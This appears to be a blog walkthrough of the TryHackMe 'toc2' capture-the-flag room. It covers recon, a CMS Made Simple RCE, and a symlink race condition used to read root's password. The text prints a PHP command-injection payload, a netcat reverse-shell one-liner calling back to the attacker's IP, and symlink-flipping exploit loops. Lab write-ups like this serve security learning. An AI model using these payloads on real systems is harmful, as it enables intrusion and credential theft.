---
title: "toc2 - TryHackMe"
date: 2022-03-15T10:45:50-03:00
---

https://tryhackme.com/room/toc2

## **User Flag**
First, we use nmap to see what ports are open.

![nmap-toc2](/toc2/nmap-toc2.png)

We notice that ports 22 and 80 are open. Since we hardly have something to explore on SSH, we start by accessing the website.

![site-toc2](/toc2/site-toc2.png)

Here we collect a username and password (*cmsmuser:devpass*) and maybe another possible username (*Hunter*).

One of the nmap scripts brought us an existing *robots.txt* entry, so let's check it out.

![robots-toc2](/toc2/robots-toc2.png)

Here we find the installation path for cmsms, which is the manager that should be installed in this application, and we also collect the name of the db to be used: *cmsmsdb*.

![cmsms-toc2](/toc2/cmsms-toc2.png)

By accessing the indicated directory, we can proceed with the installation of the system.
First of all, since we can check the version used, let's look for any known vulnerabilities in cmsms 2.1.6.

As soon as we search, we already get a Remote Code Execution exploit. Perfect!  
https://www.exploit-db.com/exploits/44192

![exploit-toc2](/toc2/exploit-toc2.png)

Following the exploit, we notice that it already starts to be exploited when installing the manager itself.

To perform the installation, we enter the data collected earlier. Before proceeding to the next step, we intercept this request and enter the payload *junk';echo%20system($_GET['cmd']);$junk='junk* in the UTC field.

![database-toc2](/toc2/database-toc2.png)

![burpsuite-toc2](/toc2/cmsms2-toc2.png)

Now we access the address *http://10.10.169.35/cmsms/config.php?cmd=id;uname* and notice that the command entered in the cmd parameter is executed on the victim host and returned to us.

![cmd-execution-toc2](/toc2/cmsms2-cmd-toc2.png)

Since we can run remote commands, we can try a reverse shell.

I used the payload *rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.117.185 3333 >/tmp/f* encoded to URL.

![first-access-toc2](/toc2/initial-access-toc2.png)

When I first got access to the machine I used python to get a stable shell, but this is not necessary since we got frank's password from the file *new_machine.txt* located in his home folder to make a ssh connection.

There we also get the user flag!

![user-txt-toc2](/toc2/user-txt-toc2.png)

## Root Flag

On frank's home we notice an interesting directory called *root_access*. Inside it we have a c file, an executable and a text file that only the root user is allowed to read.

When reading the c file to understand what the executable does, we realize that it is used to read files, but only files that the user running it has permission to read.

Probably our mission is to use *readcreads* to read the file *root_password_backup* and get root's password.

![readcreds-toc2](/toc2/readcreds-toc2.png)

I spent some time trying to figure out how to exploit this program until I took a look at the hint offered by the CTF. In the github located in the hint, we noticed that it is a *race condition vulnerability*.

Researching a bit, I came across [this link](https://samsclass.info/127/proj/E10.htm) that talks about exploiting programs that use the *access()* function and also have some *time interval* before the time of usage.

The article shows exactly how to exploit this vulnerability. We create a file to which we have read access. Then we create a symbolic link called flip pointing to this file. When trying to read the symbolic link we are able to use readcreds correctly.

I then point the flip to root_password_backup just for a test case. Trying to read "flip" with readcreds logically returns an error.

![root-flag1-toc2](/toc2/root-flag-toc2.png)

Now we will actually explore this race condition. First, we create a loop with this command:
*while true; do ln -sf root_password_backup flip; ln -sf public flip; done &*

This command will constantly change the symbolic link between the file we have access to and the file with the root password.

Then we run a loop to execute the program multiple times by reading the symbolic link with this command: *for i in {1...30}; do ./readcreds flip; done*

The trick here is that at some point the program will do a condition check with the permissions on the public file, and when it reads the "flip" file, the symbolic link will have already been changed and will be pointing to root_password_backup.

![root-flag2-toc2](/toc2/root2-flag-toc2.png)

If you want to understand more about this race condition vulnerability, you can watch [this video](https://www.youtube.com/watch?v=5g137gsB9Wk). 

See ya =).


